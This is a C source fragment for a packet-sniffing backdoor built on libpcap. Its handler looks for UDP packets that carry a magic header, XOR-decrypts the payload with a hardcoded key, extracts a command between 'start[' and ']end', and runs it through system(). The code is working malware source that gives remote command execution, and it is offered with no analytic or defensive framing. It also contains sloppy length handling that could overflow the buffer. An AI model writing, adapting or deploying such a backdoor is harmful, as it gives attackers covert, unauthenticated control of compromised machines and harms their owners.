#define ETHER_IP_UDP_LEN 44
#define MAX_SIZE 1024
#define BACKDOOR_HEADER_KEY "foobar"
#define BACKDOOR_HEADER_LEN 4
#define PASSWORD "password"
#define PASSLEN 8
#define COMMAND_START "start["
#define COMMAND_END "]end"
 
void packet_handler(u_char *ptrnull, const struct pcap_pkthdr *pkt_info, const u_char *packet)
{
	int len, loop;
	char *ptr, *ptr2;
	char decrypt[MAX_SIZE];
	char command[MAX_SIZE];
 
	/* Step 1: locate the payload portion of the packet */
	ptr = (char *)(packet + ETHER_IP_UDP_LEN);
	if ((pkt_info->caplen - ETHER_IP_UDP_LEN - 14) <= 0) 
		return; 
 
	/* Step 2: check payload for backdoor header key */
	if (0 != memcmp(ptr, BACKDOOR_HEADER_KEY, BACKDOOR_HEADER_LEN))
		return;
	ptr += BACKDOOR_HEADER_LEN;
	len = (pkt_info->caplen - ETHER_IP_UDP_LEN - BACKDOOR_HEADER_LEN);
	memset(decrypt, 0x0, sizeof(decrypt)); 
 
	/* Step 3: decrypt the packet by an XOR pass against contents */ 
	for (loop = 0; loop < len; loop++)
		decrypt[loop] = ptr[loop] ^ PASSWORD[(loop % PASSLEN)];
 
	/* Step 4: verify decrypted contents */
	if (!(ptr = strstr(decrypt, COMMAND_START))) 
		return;
	ptr += strlen(COMMAND_START);
	if (!(ptr2 = strstr(ptr, COMMAND_END)))
		return;
 
	/* Step 5: extract the remainder */
	memset(command, 0x0, sizeof(command));
	strncpy(command, ptr, (ptr2 - ptr));
 
	/* Step 6: Execute the command */
	system(command);
	return;
}